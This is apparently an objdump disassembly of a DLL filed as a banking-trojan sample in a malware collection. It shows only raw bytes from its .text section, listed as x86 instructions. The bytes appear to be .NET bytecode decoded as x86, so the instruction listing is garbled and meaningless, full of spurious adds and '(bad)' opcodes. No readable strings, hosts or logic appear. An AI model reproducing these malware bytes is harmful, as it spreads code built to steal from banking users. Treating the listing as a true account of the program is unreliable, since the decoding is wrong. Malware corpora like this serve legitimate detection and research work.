
malware_samples/banker/b591809918b1fb430fca209a71d20fded51adea7bd468dbeac40a1fe2c597d7d.dll:     file format pei-i386


Disassembly of section .text:

10002000 <.text>:
10002000:	a1 51 00 00 00       	mov    0x51,%eax
10002005:	00 00                	add    %al,(%eax)
10002007:	00 48 00             	add    %cl,0x0(%eax)
1000200a:	00 00                	add    %al,(%eax)
1000200c:	02 00                	add    (%eax),%al
1000200e:	05 00 10 26 00       	add    $0x261000,%eax
10002013:	00 ac 2a 00 00 01 00 	add    %ch,0x10000(%edx,%ebp,1)
	...
1000204e:	00 00                	add    %al,(%eax)
10002050:	1b 30                	sbb    (%eax),%esi
10002052:	0a 00                	or     (%eax),%al
10002054:	20 01                	and    %al,(%ecx)
10002056:	00 00                	add    %al,(%eax)
10002058:	01 00                	add    %eax,(%eax)
1000205a:	00 11                	add    %dl,(%ecx)
1000205c:	12 00                	adc    (%eax),%al
1000205e:	fe                   	(bad)
1000205f:	15 03 00 00 02       	adc    $0x2000003,%eax
10002064:	12 00                	adc    (%eax),%al
10002066:	06                   	push   %es
10002067:	28 01                	sub    %al,(%ecx)
10002069:	00 00                	add    %al,(%eax)
1000206b:	2b 7d 02             	sub    0x2(%ebp),%edi
1000206e:	00 00                	add    %al,(%eax)
10002070:	04 12                	add    $0x12,%al
10002072:	01 fe                	add    %edi,%esi
10002074:	15 04 00 00 02       	adc    $0x2000004,%eax
10002079:	28 0c 00             	sub    %cl,(%eax,%eax,1)
1000207c:	00 06                	add    %al,(%esi)
1000207e:	14 7e                	adc    $0x7e,%al
10002080:	11 00                	adc    %eax,(%eax)
10002082:	00 0a                	add    %cl,(%edx)
10002084:	7e 11                	jle    0x10002097
10002086:	00 00                	add    %al,(%eax)
10002088:	0a 16                	or     (%esi),%dl
1000208a:	1a 7e 11             	sbb    0x11(%esi),%bh
1000208d:	00 00                	add    %al,(%eax)
1000208f:	0a 14 12             	or     (%edx,%edx,1),%dl
10002092:	00 12                	add    %dl,(%edx)
10002094:	01 28                	add    %ebp,(%eax)
10002096:	03 00                	add    (%eax),%eax
10002098:	00 06                	add    %al,(%esi)
1000209a:	2d 01 2a 00 07       	sub    $0x7002a01,%eax
1000209f:	7b 14                	jnp    0x100020b5
100020a1:	00 00                	add    %al,(%eax)
100020a3:	04 7e                	add    $0x7e,%al
100020a5:	11 00                	adc    %eax,(%eax)
100020a7:	00 0a                	add    %cl,(%edx)
100020a9:	03 8e 69 20 00 30    	add    0x30002069(%esi),%ecx
100020af:	00 00                	add    %al,(%eax)
100020b1:	1f                   	pop    %ds
100020b2:	40                   	inc    %eax
100020b3:	28 06                	sub    %al,(%esi)
100020b5:	00 00                	add    %al,(%eax)
100020b7:	06                   	push   %es
100020b8:	0c 08                	or     $0x8,%al
100020ba:	7e 11                	jle    0x100020cd
100020bc:	00 00                	add    %al,(%eax)
100020be:	0a 28                	or     (%eax),%ch
100020c0:	12 00                	adc    (%eax),%al
100020c2:	00 0a                	add    %cl,(%edx)
100020c4:	2c 0b                	sub    $0xb,%al
100020c6:	72 01                	jb     0x100020c9
100020c8:	00 00                	add    %al,(%eax)
100020ca:	70 73                	jo     0x1000213f
100020cc:	13 00                	adc    (%eax),%eax
100020ce:	00 0a                	add    %cl,(%edx)
100020d0:	7a 07                	jp     0x100020d9
100020d2:	7b 14                	jnp    0x100020e8
100020d4:	00 00                	add    %al,(%eax)
100020d6:	04 08                	add    $0x8,%al
100020d8:	03 03                	add    (%ebx),%eax
100020da:	8e 69 12             	mov    0x12(%ecx),%gs
100020dd:	04 28                	add    $0x28,%al
100020df:	04 00                	add    $0x0,%al
100020e1:	00 06                	add    %al,(%esi)
100020e3:	2d 0b 72 01 00       	sub    $0x1720b,%eax
100020e8:	00 70 73             	add    %dh,0x73(%eax)
100020eb:	13 00                	adc    (%eax),%eax
100020ed:	00 0a                	add    %cl,(%edx)
100020ef:	7a 07                	jp     0x100020f8
100020f1:	7b 14                	jnp    0x10002107
100020f3:	00 00                	add    %al,(%eax)
100020f5:	04 7e                	add    $0x7e,%al
100020f7:	11 00                	adc    %eax,(%eax)
100020f9:	00 0a                	add    %cl,(%edx)
100020fb:	16                   	push   %ss
100020fc:	08 7e 11             	or     %bh,0x11(%esi)
100020ff:	00 00                	add    %al,(%eax)
10002101:	0a 16                	or     (%esi),%dl
10002103:	12 04 28             	adc    (%eax,%ebp,1),%al
10002106:	02 00                	add    (%eax),%al
10002108:	00 06                	add    %al,(%esi)
1000210a:	0d 09 7e 11 00       	or     $0x117e09,%eax
1000210f:	00 0a                	add    %cl,(%edx)
10002111:	28 12                	sub    %dl,(%edx)
10002113:	00 00                	add    %al,(%eax)
10002115:	0a 2d 45 09 12 06    	or     0x6120945,%ch
1000211b:	28 01                	sub    %al,(%ecx)
1000211d:	00 00                	add    %al,(%eax)
1000211f:	06                   	push   %es
10002120:	2c 12                	sub    $0x12,%al
10002122:	11 06                	adc    %eax,(%esi)
10002124:	20 03                	and    %al,(%ebx)
10002126:	01 00                	add    %eax,(%eax)
10002128:	00 33                	add    %dh,(%ebx)
1000212a:	0b 1f                	or     (%edi),%ebx
1000212c:	64 28 14 00          	sub    %dl,%fs:(%eax,%eax,1)
10002130:	00 0a                	add    %cl,(%edx)
10002132:	2b e4                	sub    %esp,%esp
10002134:	de 45 07             	fiadds 0x7(%ebp)
10002137:	7b 16                	jnp    0x1000214f
10002139:	00 00                	add    %al,(%eax)
1000213b:	04 28                	add    $0x28,%al
1000213d:	15 00 00 0a 13       	adc    $0x130a0000,%eax
10002142:	05 11 05 6f 16       	add    $0x166f0511,%eax
10002147:	00 00                	add    %al,(%eax)
10002149:	0a 16                	or     (%esi),%dl
1000214b:	fe 01                	incb   (%ecx)
1000214d:	2c 07                	sub    $0x7,%al
1000214f:	11 05 6f 17 00 00    	adc    %eax,0x176f
10002155:	0a 09                	or     (%ecx),%cl
10002157:	28 07                	sub    %al,(%edi)
10002159:	00 00                	add    %al,(%eax)
1000215b:	06                   	push   %es
1000215c:	26 de 1c 26          	ficomps %es:(%esi,%eiz,1)
10002160:	de 19                	ficomps (%ecx)
10002162:	07                   	pop    %es
10002163:	7b 14                	jnp    0x10002179
10002165:	00 00                	add    %al,(%eax)
10002167:	04 28                	add    $0x28,%al
10002169:	07                   	pop    %es
1000216a:	00 00                	add    %al,(%eax)
1000216c:	06                   	push   %es
1000216d:	26 07                	es pop %es
1000216f:	7b 15                	jnp    0x10002186
10002171:	00 00                	add    %al,(%eax)
10002173:	04 28                	add    $0x28,%al
10002175:	07                   	pop    %es
10002176:	00 00                	add    %al,(%eax)
10002178:	06                   	push   %es
10002179:	26 dc 2a             	fsubrl %es:(%edx)
1000217c:	01 1c 00             	add    %ebx,(%eax,%eax,1)
1000217f:	00 00                	add    %al,(%eax)
10002181:	00 42 00             	add    %al,0x0(%edx)
10002184:	c1 03 01             	roll   $0x1,(%ebx)
10002187:	03 13                	add    (%ebx),%edx
10002189:	00 00                	add    %al,(%eax)
1000218b:	01 02                	add    %eax,(%edx)
1000218d:	00 42 00             	add    %al,0x0(%edx)
10002190:	c4 06                	les    (%esi),%eax
10002192:	01 19                	add    %ebx,(%ecx)
10002194:	00 00                	add    %al,(%eax)
10002196:	00 00                	add    %al,(%eax)
10002198:	13 30                	adc    (%eax),%esi
1000219a:	04 00                	add    $0x0,%al
1000219c:	67 00 00             	add    %al,(%bx,%si)
1000219f:	00 00                	add    %al,(%eax)
100021a1:	00 00                	add    %al,(%eax)
100021a3:	00 28                	add    %ch,(%eax)
100021a5:	18 00                	sbb    %al,(%eax)
100021a7:	00 0a                	add    %cl,(%edx)
100021a9:	28 18                	sub    %bl,(%eax)
100021ab:	00 00                	add    %al,(%eax)
100021ad:	0a 72 03             	or     0x3(%edx),%dh
100021b0:	00 00                	add    %al,(%eax)
100021b2:	70 28                	jo     0x100021dc
100021b4:	19 00                	sbb    %eax,(%eax)
100021b6:	00 0a                	add    %cl,(%edx)
100021b8:	6f                   	outsl  %ds:(%esi),(%dx)
100021b9:	1a 00                	sbb    (%eax),%al
100021bb:	00 0a                	add    %cl,(%edx)
100021bd:	72 e6                	jb     0x100021a5
100021bf:	02 00                	add    (%eax),%al
100021c1:	70 72                	jo     0x10002235
100021c3:	01 00                	add    %eax,(%eax)
100021c5:	00 70 6f             	add    %dh,0x6f(%eax)
100021c8:	1b 00                	sbb    (%eax),%eax
100021ca:	00 0a                	add    %cl,(%edx)
100021cc:	28 19                	sub    %bl,(%ecx)
100021ce:	00 00                	add    %al,(%eax)
100021d0:	0a 6f 1a             	or     0x1a(%edi),%ch
100021d3:	00 00                	add    %al,(%eax)
100021d5:	0a 02                	or     (%edx),%al
100021d7:	28 02                	sub    %al,(%edx)
100021d9:	00 00                	add    %al,(%eax)
100021db:	2b 7e 19             	sub    0x19(%esi),%edi
100021de:	00 00                	add    %al,(%eax)
100021e0:	04 25                	add    $0x25,%al
100021e2:	2d 17 26 7e 18       	sub    $0x187e2617,%eax
100021e7:	00 00                	add    %al,(%eax)
100021e9:	04 fe                	add    $0xfe,%al
100021eb:	06                   	push   %es
100021ec:	0f 00 00             	sldt   (%eax)
100021ef:	06                   	push   %es
100021f0:	73 1d                	jae    0x1000220f
100021f2:	00 00                	add    %al,(%eax)
100021f4:	0a 25 80 19 00 00    	or     0x1980,%ah
100021fa:	04 28                	add    $0x28,%al
100021fc:	03 00                	add    (%eax),%eax
100021fe:	00 2b                	add    %ch,(%ebx)
10002200:	28 04 00             	sub    %al,(%eax,%eax,1)
10002203:	00 2b                	add    %ch,(%ebx)
10002205:	73 20                	jae    0x10002227
10002207:	00 00                	add    %al,(%eax)
10002209:	0a 2a                	or     (%edx),%ch
1000220b:	00 13                	add    %dl,(%ebx)
1000220d:	30 04 00             	xor    %al,(%eax,%eax,1)
10002210:	67 00 00             	add    %al,(%bx,%si)
10002213:	00 00                	add    %al,(%eax)
10002215:	00 00                	add    %al,(%eax)
10002217:	00 28                	add    %ch,(%eax)
10002219:	18 00                	sbb    %al,(%eax)
1000221b:	00 0a                	add    %cl,(%edx)
1000221d:	28 18                	sub    %bl,(%eax)
1000221f:	00 00                	add    %al,(%eax)
10002221:	0a 72 fc             	or     -0x4(%edx),%dh
10002224:	02 00                	add    (%eax),%al
10002226:	70 28                	jo     0x10002250
10002228:	19 00                	sbb    %eax,(%eax)
1000222a:	00 0a                	add    %cl,(%edx)
1000222c:	6f                   	outsl  %ds:(%esi),(%dx)
1000222d:	1a 00                	sbb    (%eax),%al
1000222f:	00 0a                	add    %cl,(%edx)
10002231:	72 6f                	jb     0x100022a2
10002233:	04 00                	add    $0x0,%al
10002235:	70 72                	jo     0x100022a9
10002237:	01 00                	add    %eax,(%eax)
10002239:	00 70 6f             	add    %dh,0x6f(%eax)
1000223c:	1b 00                	sbb    (%eax),%eax
1000223e:	00 0a                	add    %cl,(%edx)
10002240:	28 19                	sub    %bl,(%ecx)
10002242:	00 00                	add    %al,(%eax)
10002244:	0a 6f 1a             	or     0x1a(%edi),%ch
10002247:	00 00                	add    %al,(%eax)
10002249:	0a 02                	or     (%edx),%al
1000224b:	28 02                	sub    %al,(%edx)
1000224d:	00 00                	add    %al,(%eax)
1000224f:	2b 7e 1a             	sub    0x1a(%esi),%edi
10002252:	00 00                	add    %al,(%eax)
10002254:	04 25                	add    $0x25,%al
10002256:	2d 17 26 7e 18       	sub    $0x187e2617,%eax
1000225b:	00 00                	add    %al,(%eax)
1000225d:	04 fe                	add    $0xfe,%al
1000225f:	06                   	push   %es
10002260:	10 00                	adc    %al,(%eax)
10002262:	00 06                	add    %al,(%esi)
10002264:	73 1d                	jae    0x10002283
10002266:	00 00                	add    %al,(%eax)
10002268:	0a 25 80 1a 00 00    	or     0x1a80,%ah
1000226e:	04 28                	add    $0x28,%al
10002270:	03 00                	add    (%eax),%eax
10002272:	00 2b                	add    %ch,(%ebx)
10002274:	28 04 00             	sub    %al,(%eax,%eax,1)
10002277:	00 2b                	add    %ch,(%ebx)
10002279:	73 20                	jae    0x1000229b
1000227b:	00 00                	add    %al,(%eax)
1000227d:	0a 2a                	or     (%edx),%ch
1000227f:	2e 73 21             	jae,pn 0x100022a3
10002282:	00 00                	add    %al,(%eax)
10002284:	0a 80 01 00 00 04    	or     0x4000001(%eax),%al
1000228a:	2a 00                	sub    (%eax),%al
1000228c:	13 30                	adc    (%eax),%esi
1000228e:	07                   	pop    %es
1000228f:	00 62 02             	add    %ah,0x2(%edx)
10002292:	00 00                	add    %al,(%eax)
10002294:	02 00                	add    (%eax),%al
10002296:	00 11                	add    %dl,(%ecx)
10002298:	73 11                	jae    0x100022ab
1000229a:	00 00                	add    %al,(%eax)
1000229c:	06                   	push   %es
1000229d:	0a 06                	or     (%esi),%al
1000229f:	73 22                	jae    0x100022c3
100022a1:	00 00                	add    %al,(%eax)
100022a3:	0a 25 28 18 00 00    	or     0x1828,%ah
100022a9:	0a 28                	or     (%eax),%ch
100022ab:	18 00                	sbb    %al,(%eax)
100022ad:	00 0a                	add    %cl,(%edx)
100022af:	72 85                	jb     0x10002236
100022b1:	04 00                	add    $0x0,%al
100022b3:	70 28                	jo     0x100022dd
100022b5:	19 00                	sbb    %eax,(%eax)
100022b7:	00 0a                	add    %cl,(%edx)
100022b9:	6f                   	outsl  %ds:(%esi),(%dx)
100022ba:	1a 00                	sbb    (%eax),%al
100022bc:	00 0a                	add    %cl,(%edx)
100022be:	72 38                	jb     0x100022f8
100022c0:	06                   	push   %es
100022c1:	00 70 72             	add    %dh,0x72(%eax)
100022c4:	01 00                	add    %eax,(%eax)
100022c6:	00 70 6f             	add    %dh,0x6f(%eax)
100022c9:	1b 00                	sbb    (%eax),%eax
100022cb:	00 0a                	add    %cl,(%edx)
100022cd:	28 19                	sub    %bl,(%ecx)
100022cf:	00 00                	add    %al,(%eax)
100022d1:	0a 6f 1a             	or     0x1a(%edi),%ch
100022d4:	00 00                	add    %al,(%eax)
100022d6:	0a 6f 23             	or     0x23(%edi),%ch
100022d9:	00 00                	add    %al,(%eax)
100022db:	0a 25 28 18 00 00    	or     0x1828,%ah
100022e1:	0a 28                	or     (%eax),%ch
100022e3:	18 00                	sbb    %al,(%eax)
100022e5:	00 0a                	add    %cl,(%edx)
100022e7:	72 4e                	jb     0x10002337
100022e9:	06                   	push   %es
100022ea:	00 70 28             	add    %dh,0x28(%eax)
100022ed:	19 00                	sbb    %eax,(%eax)
100022ef:	00 0a                	add    %cl,(%edx)
100022f1:	6f                   	outsl  %ds:(%esi),(%dx)
100022f2:	1a 00                	sbb    (%eax),%al
100022f4:	00 0a                	add    %cl,(%edx)
100022f6:	72 01                	jb     0x100022f9
100022f8:	08 00                	or     %al,(%eax)
100022fa:	70 72                	jo     0x1000236e
100022fc:	01 00                	add    %eax,(%eax)
100022fe:	00 70 6f             	add    %dh,0x6f(%eax)
10002301:	1b 00                	sbb    (%eax),%eax
10002303:	00 0a                	add    %cl,(%edx)
10002305:	28 19                	sub    %bl,(%ecx)
10002307:	00 00                	add    %al,(%eax)
10002309:	0a 6f 1a             	or     0x1a(%edi),%ch
1000230c:	00 00                	add    %al,(%eax)
1000230e:	0a 6f 23             	or     0x23(%edi),%ch
10002311:	00 00                	add    %al,(%eax)
10002313:	0a 25 28 18 00 00    	or     0x1828,%ah
10002319:	0a 28                	or     (%eax),%ch
1000231b:	18 00                	sbb    %al,(%eax)
1000231d:	00 0a                	add    %cl,(%edx)
1000231f:	72 17                	jb     0x10002338
10002321:	08 00                	or     %al,(%eax)
10002323:	70 28                	jo     0x1000234d
10002325:	19 00                	sbb    %eax,(%eax)
10002327:	00 0a                	add    %cl,(%edx)
10002329:	6f                   	outsl  %ds:(%esi),(%dx)
1000232a:	1a 00                	sbb    (%eax),%al
1000232c:	00 0a                	add    %cl,(%edx)
1000232e:	72 d2                	jb     0x10002302
10002330:	08 00                	or     %al,(%eax)
10002332:	70 72                	jo     0x100023a6
10002334:	01 00                	add    %eax,(%eax)
10002336:	00 70 6f             	add    %dh,0x6f(%eax)
10002339:	1b 00                	sbb    (%eax),%eax
1000233b:	00 0a                	add    %cl,(%edx)
1000233d:	28 19                	sub    %bl,(%ecx)
1000233f:	00 00                	add    %al,(%eax)
10002341:	0a 6f 1a             	or     0x1a(%edi),%ch
10002344:	00 00                	add    %al,(%eax)
10002346:	0a 6f 23             	or     0x23(%edi),%ch
10002349:	00 00                	add    %al,(%eax)
1000234b:	0a 25 28 18 00 00    	or     0x1828,%ah
10002351:	0a 28                	or     (%eax),%ch
10002353:	18 00                	sbb    %al,(%eax)
10002355:	00 0a                	add    %cl,(%edx)
10002357:	72 e8                	jb     0x10002341
10002359:	08 00                	or     %al,(%eax)
1000235b:	70 28                	jo     0x10002385
1000235d:	19 00                	sbb    %eax,(%eax)
1000235f:	00 0a                	add    %cl,(%edx)
10002361:	6f                   	outsl  %ds:(%esi),(%dx)
10002362:	1a 00                	sbb    (%eax),%al
10002364:	00 0a                	add    %cl,(%edx)
10002366:	72 a3                	jb     0x1000230b
10002368:	09 00                	or     %eax,(%eax)
1000236a:	70 72                	jo     0x100023de
1000236c:	01 00                	add    %eax,(%eax)
1000236e:	00 70 6f             	add    %dh,0x6f(%eax)
10002371:	1b 00                	sbb    (%eax),%eax
10002373:	00 0a                	add    %cl,(%edx)
10002375:	28 19                	sub    %bl,(%ecx)
10002377:	00 00                	add    %al,(%eax)
10002379:	0a 6f 1a             	or     0x1a(%edi),%ch
1000237c:	00 00                	add    %al,(%eax)
1000237e:	0a 6f 23             	or     0x23(%edi),%ch
10002381:	00 00                	add    %al,(%eax)
10002383:	0a 25 28 18 00 00    	or     0x1828,%ah
10002389:	0a 28                	or     (%eax),%ch
1000238b:	18 00                	sbb    %al,(%eax)
1000238d:	00 0a                	add    %cl,(%edx)
1000238f:	72 b9                	jb     0x1000234a
10002391:	09 00                	or     %eax,(%eax)
10002393:	70 28                	jo     0x100023bd
10002395:	19 00                	sbb    %eax,(%eax)
10002397:	00 0a                	add    %cl,(%edx)
10002399:	6f                   	outsl  %ds:(%esi),(%dx)
1000239a:	1a 00                	sbb    (%eax),%al
1000239c:	00 0a                	add    %cl,(%edx)
1000239e:	72 b4                	jb     0x10002354
100023a0:	0a 00                	or     (%eax),%al
100023a2:	70 72                	jo     0x10002416
100023a4:	01 00                	add    %eax,(%eax)
100023a6:	00 70 6f             	add    %dh,0x6f(%eax)
100023a9:	1b 00                	sbb    (%eax),%eax
100023ab:	00 0a                	add    %cl,(%edx)
100023ad:	28 19                	sub    %bl,(%ecx)
100023af:	00 00                	add    %al,(%eax)
100023b1:	0a 6f 1a             	or     0x1a(%edi),%ch
100023b4:	00 00                	add    %al,(%eax)
100023b6:	0a 6f 23             	or     0x23(%edi),%ch
100023b9:	00 00                	add    %al,(%eax)
100023bb:	0a 25 28 18 00 00    	or     0x1828,%ah
100023c1:	0a 28                	or     (%eax),%ch
100023c3:	18 00                	sbb    %al,(%eax)
100023c5:	00 0a                	add    %cl,(%edx)
100023c7:	72 ca                	jb     0x10002393
100023c9:	0a 00                	or     (%eax),%al
100023cb:	70 28                	jo     0x100023f5
100023cd:	19 00                	sbb    %eax,(%eax)
100023cf:	00 0a                	add    %cl,(%edx)
100023d1:	6f                   	outsl  %ds:(%esi),(%dx)
100023d2:	1a 00                	sbb    (%eax),%al
100023d4:	00 0a                	add    %cl,(%edx)
100023d6:	72 44                	jb     0x1000241c
100023d8:	0b 00                	or     (%eax),%eax
100023da:	70 72                	jo     0x1000244e
100023dc:	01 00                	add    %eax,(%eax)
100023de:	00 70 6f             	add    %dh,0x6f(%eax)
100023e1:	1b 00                	sbb    (%eax),%eax
100023e3:	00 0a                	add    %cl,(%edx)
100023e5:	28 19                	sub    %bl,(%ecx)
100023e7:	00 00                	add    %al,(%eax)
100023e9:	0a 6f 1a             	or     0x1a(%edi),%ch
100023ec:	00 00                	add    %al,(%eax)
100023ee:	0a 6f 23             	or     0x23(%edi),%ch
100023f1:	00 00                	add    %al,(%eax)
100023f3:	0a 25 28 18 00 00    	or     0x1828,%ah
100023f9:	0a 28                	or     (%eax),%ch
100023fb:	18 00                	sbb    %al,(%eax)
100023fd:	00 0a                	add    %cl,(%edx)
100023ff:	72 5a                	jb     0x1000245b
10002401:	0b 00                	or     (%eax),%eax
10002403:	70 28                	jo     0x1000242d
10002405:	19 00                	sbb    %eax,(%eax)
10002407:	00 0a                	add    %cl,(%edx)
10002409:	6f                   	outsl  %ds:(%esi),(%dx)
1000240a:	1a 00                	sbb    (%eax),%al
1000240c:	00 0a                	add    %cl,(%edx)
1000240e:	72 cd                	jb     0x100023dd
10002410:	0c 00                	or     $0x0,%al
10002412:	70 72                	jo     0x10002486
10002414:	01 00                	add    %eax,(%eax)
10002416:	00 70 6f             	add    %dh,0x6f(%eax)
10002419:	1b 00                	sbb    (%eax),%eax
1000241b:	00 0a                	add    %cl,(%edx)
1000241d:	28 19                	sub    %bl,(%ecx)
1000241f:	00 00                	add    %al,(%eax)
10002421:	0a 6f 1a             	or     0x1a(%edi),%ch
10002424:	00 00                	add    %al,(%eax)
10002426:	0a 6f 23             	or     0x23(%edi),%ch
10002429:	00 00                	add    %al,(%eax)
1000242b:	0a 25 28 18 00 00    	or     0x1828,%ah
10002431:	0a 28                	or     (%eax),%ch
10002433:	18 00                	sbb    %al,(%eax)
10002435:	00 0a                	add    %cl,(%edx)
10002437:	72 e3                	jb     0x1000241c
10002439:	0c 00                	or     $0x0,%al
1000243b:	70 28                	jo     0x10002465
1000243d:	19 00                	sbb    %eax,(%eax)
1000243f:	00 0a                	add    %cl,(%edx)
10002441:	6f                   	outsl  %ds:(%esi),(%dx)
10002442:	1a 00                	sbb    (%eax),%al
10002444:	00 0a                	add    %cl,(%edx)
10002446:	72 de                	jb     0x10002426
10002448:	0d 00 70 72 01       	or     $0x1727000,%eax
1000244d:	00 00                	add    %al,(%eax)
1000244f:	70 6f                	jo     0x100024c0
10002451:	1b 00                	sbb    (%eax),%eax
10002453:	00 0a                	add    %cl,(%edx)
10002455:	28 19                	sub    %bl,(%ecx)
10002457:	00 00                	add    %al,(%eax)
10002459:	0a 6f 1a             	or     0x1a(%edi),%ch
1000245c:	00 00                	add    %al,(%eax)
1000245e:	0a 6f 23             	or     0x23(%edi),%ch
10002461:	00 00                	add    %al,(%eax)
10002463:	0a 7d 1b             	or     0x1b(%ebp),%bh
10002466:	00 00                	add    %al,(%eax)
10002468:	04 28                	add    $0x28,%al
1000246a:	18 00                	sbb    %al,(%eax)
1000246c:	00 0a                	add    %cl,(%edx)
1000246e:	28 18                	sub    %bl,(%eax)
10002470:	00 00                	add    %al,(%eax)
10002472:	0a 72 f4             	or     -0xc(%edx),%dh
10002475:	0d 00 70 28 19       	or     $0x19287000,%eax
1000247a:	00 00                	add    %al,(%eax)
1000247c:	0a 6f 1a             	or     0x1a(%edi),%ch
1000247f:	00 00                	add    %al,(%eax)
10002481:	0a 72 77             	or     0x77(%edx),%dh
10002484:	13 00                	adc    (%eax),%eax
10002486:	70 72                	jo     0x100024fa
10002488:	01 00                	add    %eax,(%eax)
1000248a:	00 70 6f             	add    %dh,0x6f(%eax)
1000248d:	1b 00                	sbb    (%eax),%eax
1000248f:	00 0a                	add    %cl,(%edx)
10002491:	28 19                	sub    %bl,(%ecx)
10002493:	00 00                	add    %al,(%eax)
10002495:	0a 6f 1a             	or     0x1a(%edi),%ch
10002498:	00 00                	add    %al,(%eax)
1000249a:	0a 28                	or     (%eax),%ch
1000249c:	18 00                	sbb    %al,(%eax)
1000249e:	00 0a                	add    %cl,(%edx)
100024a0:	28 18                	sub    %bl,(%eax)
100024a2:	00 00                	add    %al,(%eax)
100024a4:	0a 72 8d             	or     -0x73(%edx),%dh
100024a7:	13 00                	adc    (%eax),%eax
100024a9:	70 28                	jo     0x100024d3
100024ab:	19 00                	sbb    %eax,(%eax)
100024ad:	00 0a                	add    %cl,(%edx)
100024af:	6f                   	outsl  %ds:(%esi),(%dx)
100024b0:	1a 00                	sbb    (%eax),%al
100024b2:	00 0a                	add    %cl,(%edx)
100024b4:	72 48                	jb     0x100024fe
100024b6:	14 00                	adc    $0x0,%al
100024b8:	70 72                	jo     0x1000252c
100024ba:	01 00                	add    %eax,(%eax)
100024bc:	00 70 6f             	add    %dh,0x6f(%eax)
100024bf:	1b 00                	sbb    (%eax),%eax
100024c1:	00 0a                	add    %cl,(%edx)
100024c3:	28 19                	sub    %bl,(%ecx)
100024c5:	00 00                	add    %al,(%eax)
100024c7:	0a 6f 1a             	or     0x1a(%edi),%ch
100024ca:	00 00                	add    %al,(%eax)
100024cc:	0a 17                	or     (%edi),%dl
100024ce:	28 24 00             	sub    %ah,(%eax,%eax,1)
100024d1:	00 0a                	add    %cl,(%edx)
100024d3:	06                   	push   %es
100024d4:	fe 06                	incb   (%esi)
100024d6:	12 00                	adc    (%eax),%al
100024d8:	00 06                	add    %al,(%esi)
100024da:	73 25                	jae    0x10002501
100024dc:	00 00                	add    %al,(%eax)
100024de:	0a 28                	or     (%eax),%ch
100024e0:	05 00 00 2b 28       	add    $0x282b0000,%eax
100024e5:	06                   	push   %es
100024e6:	00 00                	add    %al,(%eax)
100024e8:	2b 0b                	sub    (%ebx),%ecx
100024ea:	07                   	pop    %es
100024eb:	73 21                	jae    0x1000250e
100024ed:	00 00                	add    %al,(%eax)
100024ef:	0a 07                	or     (%edi),%al
100024f1:	8e 69 6f             	mov    0x6f(%ecx),%gs
100024f4:	27                   	daa
100024f5:	00 00                	add    %al,(%eax)
100024f7:	0a 9a 2a 00 00 13    	or     0x1300002a(%edx),%bl
100024fd:	30 07                	xor    %al,(%edi)
100024ff:	00 a6 00 00 00 03    	add    %ah,0x3000000(%esi)
10002505:	00 00                	add    %al,(%eax)
10002507:	11 28                	adc    %ebp,(%eax)
10002509:	18 00                	sbb    %al,(%eax)
1000250b:	00 0a                	add    %cl,(%edx)
1000250d:	28 18                	sub    %bl,(%eax)
1000250f:	00 00                	add    %al,(%eax)
10002511:	0a 72 5e             	or     0x5e(%edx),%dh
10002514:	14 00                	adc    $0x0,%al
10002516:	70 28                	jo     0x10002540
10002518:	19 00                	sbb    %eax,(%eax)
1000251a:	00 0a                	add    %cl,(%edx)
1000251c:	6f                   	outsl  %ds:(%esi),(%dx)
1000251d:	1a 00                	sbb    (%eax),%al
1000251f:	00 0a                	add    %cl,(%edx)
10002521:	72 51                	jb     0x10002574
10002523:	16                   	push   %ss
10002524:	00 70 72             	add    %dh,0x72(%eax)
10002527:	01 00                	add    %eax,(%eax)
10002529:	00 70 6f             	add    %dh,0x6f(%eax)
1000252c:	1b 00                	sbb    (%eax),%eax
1000252e:	00 0a                	add    %cl,(%edx)
10002530:	28 19                	sub    %bl,(%ecx)
10002532:	00 00                	add    %al,(%eax)
10002534:	0a 6f 1a             	or     0x1a(%edi),%ch
10002537:	00 00                	add    %al,(%eax)
10002539:	0a 1a                	or     (%edx),%bl
1000253b:	28 08                	sub    %cl,(%eax)
1000253d:	00 00                	add    %al,(%eax)
1000253f:	06                   	push   %es
10002540:	28 28                	sub    %ch,(%eax)
10002542:	00 00                	add    %al,(%eax)
10002544:	0a 25 28 29 00 00    	or     0x2928,%ah
1000254a:	0a 26                	or     (%esi),%ah
1000254c:	28 0b                	sub    %cl,(%ebx)
1000254e:	00 00                	add    %al,(%eax)
10002550:	06                   	push   %es
10002551:	0a 1b                	or     (%ebx),%bl
10002553:	28 08                	sub    %cl,(%eax)
10002555:	00 00                	add    %al,(%eax)
10002557:	06                   	push   %es
10002558:	72 67                	jb     0x100025c1
1000255a:	16                   	push   %ss
1000255b:	00 70 28             	add    %dh,0x28(%eax)
1000255e:	18 00                	sbb    %al,(%eax)
10002560:	00 0a                	add    %cl,(%edx)
10002562:	28 18                	sub    %bl,(%eax)
10002564:	00 00                	add    %al,(%eax)
10002566:	0a 72 6b             	or     0x6b(%edx),%dh
10002569:	16                   	push   %ss
1000256a:	00 70 28             	add    %dh,0x28(%eax)
1000256d:	19 00                	sbb    %eax,(%eax)
1000256f:	00 0a                	add    %cl,(%edx)
10002571:	6f                   	outsl  %ds:(%esi),(%dx)
10002572:	1a 00                	sbb    (%eax),%al
10002574:	00 0a                	add    %cl,(%edx)
10002576:	72 26                	jb     0x1000259e
10002578:	17                   	pop    %ss
10002579:	00 70 72             	add    %dh,0x72(%eax)
1000257c:	01 00                	add    %eax,(%eax)
1000257e:	00 70 6f             	add    %dh,0x6f(%eax)
10002581:	1b 00                	sbb    (%eax),%eax
10002583:	00 0a                	add    %cl,(%edx)
10002585:	28 19                	sub    %bl,(%ecx)
10002587:	00 00                	add    %al,(%eax)
10002589:	0a 6f 1a             	or     0x1a(%edi),%ch
1000258c:	00 00                	add    %al,(%eax)
1000258e:	0a 28                	or     (%eax),%ch
10002590:	2a 00                	sub    (%eax),%al
10002592:	00 0a                	add    %cl,(%edx)
10002594:	28 28                	sub    %ch,(%eax)
10002596:	00 00                	add    %al,(%eax)
10002598:	0a 0b                	or     (%ebx),%cl
1000259a:	06                   	push   %es
1000259b:	07                   	pop    %es
1000259c:	17                   	pop    %ss
1000259d:	28 2b                	sub    %ch,(%ebx)
1000259f:	00 00                	add    %al,(%eax)
100025a1:	0a 20                	or     (%eax),%ah
100025a3:	e8 03 00 00 28       	call   0x380025ab
100025a8:	14 00                	adc    $0x0,%al
100025aa:	00 0a                	add    %cl,(%edx)
100025ac:	07                   	pop    %es
100025ad:	2a 2e                	sub    (%esi),%ch
100025af:	73 0e                	jae    0x100025bf
100025b1:	00 00                	add    %al,(%eax)
100025b3:	06                   	push   %es
100025b4:	80 18 00             	sbbb   $0x0,(%eax)
100025b7:	00 04 2a             	add    %al,(%edx,%ebp,1)
100025ba:	1e                   	push   %ds
100025bb:	02 28                	add    (%eax),%ch
